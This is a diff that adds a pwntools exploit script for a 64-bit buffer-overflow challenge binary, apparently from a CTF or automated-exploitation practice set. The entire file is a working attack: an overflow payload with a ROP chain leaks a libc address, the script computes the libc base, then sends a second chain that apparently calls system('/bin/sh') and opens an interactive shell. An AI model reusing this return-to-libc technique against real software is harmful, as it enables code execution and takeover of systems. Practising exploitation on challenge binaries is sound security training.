@@ -1,0 +1,19 @@
+from pwn import p64, u64, p32, u32
+import pwn
+import sys
+        
+pwn.context.log_level = "debug"
+pwn.context.timeout = 20
+p = pwn.process("/home/yuge/Documents/ACBEG/binaries/zeratool-challenges/overflow/4_bof_nx_64/bof_nx_64")
+pwn.gdb.attach(p)
+payload = b""
+payload += b'\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\x1a\x10@\x00\x00\x00\x00\x00\x93\x12@\x00\x00\x00\x00\x00\xf0?@\x00\x00\x00\x00\x000\x10@\x00\x00\x00\x00\x00\x93\x12@\x00\x00\x00\x00\x00\x80H@\x00\x00\x00\x00\x00p\x10@\x00\x00\x00\x00\x00M\x11@\x00\x00\x00\x00\x00xH@\x00\x00\x00\x00\x00\xb3\x11@\x00\x00\x00\x00\x00\n'
+p.send(payload)
+p.recvuntil(b'pwn_me:\nYour buffer is at 0x7fffffffffefef0\n')
+libc_base = u64(p.recv()[0:6].ljust(8,b'\x00')) + -0x21ba0
+pwn.log.success('libc_base:' + hex(libc_base))
+payload = b""
+payload += p64(0x401293) + p64(libc_base + 0x1b3d88) + p64(libc_base + 0x4f420)
+payload += b"\n"
+p.send(payload)
+p.interactive()
